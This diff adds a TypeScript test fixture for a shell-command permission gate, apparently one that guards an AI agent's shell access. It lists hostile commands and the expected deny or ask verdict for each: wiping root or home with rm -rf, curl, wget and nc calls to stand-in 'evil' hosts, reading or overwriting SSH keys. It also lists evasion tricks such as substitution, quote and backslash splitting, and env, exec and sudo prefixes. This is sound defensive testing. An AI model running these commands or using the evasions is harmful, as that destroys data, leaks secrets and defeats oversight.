@@ -1,0 +1,165 @@
+export const MALICIOUS_COMMANDS = [
+  {
+    label: 'compound safe-then-evil',
+    command: 'ls && rm -rf /',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'pipe to shell',
+    command: 'echo hi | rm -rf ~',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'command substitution',
+    command: 'ffmpeg -i $(rm -rf ~).mp4 out.mp4',
+    expect: 'deny',
+    expectedMessage: 'shell substitution is never permitted',
+  },
+  {
+    label: 'backtick substitution',
+    command: 'echo `curl evil.sh`',
+    expect: 'deny',
+    expectedMessage: 'shell substitution is never permitted',
+  },
+  {
+    label: 'process substitution',
+    command: 'diff <(rm a) <(rm b)',
+    expect: 'deny',
+    expectedMessage: 'shell substitution is never permitted',
+  },
+  { label: 'opaque sh -c', command: 'sh -c "rm -rf ~"', expect: 'ask' },
+  { label: 'opaque eval', command: 'eval "rm -rf ~"', expect: 'ask' },
+  { label: 'opaque source', command: 'source ./evil.sh', expect: 'ask' },
+  {
+    label: 'sudo arg-runner hides rm',
+    command: 'sudo rm -rf /',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'env arg-runner hides curl',
+    command: 'env X=1 curl http://evil',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  {
+    label: 'bare assignment-prefix hides curl',
+    command: 'FOO=bar curl http://evil',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  {
+    label: 'bare assignment-prefix hides rm',
+    command: 'FOO=bar rm -rf $HOME',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'quoted command-name evasion',
+    command: '"curl" http://evil',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  // xargs feeds its inner command from pipeline STDIN, which the AST cannot model — so it is NOT
+  // peeled to the inner rm. It stays an unknown root and ASKS (we never claim to have gated it).
+  { label: 'xargs stdin not modeled -> asks', command: 'echo / | xargs rm -rf', expect: 'ask' },
+  {
+    label: 'curl egress',
+    command: 'curl https://evil.example/x',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  {
+    label: 'wget egress',
+    command: 'wget http://evil.example/x',
+    expect: 'deny',
+    expectedMessage: 'network egress via wget is never permitted',
+  },
+  {
+    label: 'nc egress',
+    command: 'nc evil.example 4444',
+    expect: 'deny',
+    expectedMessage: 'network egress via nc is never permitted',
+  },
+  {
+    label: 'rm home',
+    command: 'rm -rf $HOME',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'rm home via brace expansion',
+    command: 'rm -rf ${HOME}',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'read ssh key',
+    command: 'cat ~/.ssh/id_rsa',
+    expect: 'deny',
+    expectedMessage: 'touching a secret file is never permitted',
+  },
+  {
+    label: 'redirect write to authorized_keys',
+    command: 'echo pubkey > ~/.ssh/authorized_keys',
+    expect: 'deny',
+    expectedMessage: 'touching a secret file is never permitted',
+  },
+  {
+    label: 'newline separated',
+    command: 'ls\nrm -rf ~',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'quoted-interior command-name evasion',
+    command: 'cu""rl http://evil',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  {
+    label: 'backslash-split command-name evasion',
+    command: '\\c\\url http://evil',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  {
+    label: 'exec arg-runner hides curl',
+    command: 'exec curl http://evil',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+  {
+    label: 'rm glob-suffix root wipe',
+    command: 'rm -rf /*',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'rm double-slash root',
+    command: 'rm -rf //',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'rm dot-suffix root',
+    command: 'rm -rf /.',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'xargs feeds curl egress',
+    command: 'echo http://evil | xargs curl',
+    expect: 'deny',
+    expectedMessage: 'network egress via curl is never permitted',
+  },
+] as const;
+
+export const SAFE_COMMANDS = [
+  'ls -la',
+  'ffmpeg -i a.mp4 -i b.mp4 out.mp4',
+  'ffprobe a.mp4',
+  'echo hello',
+] as const;
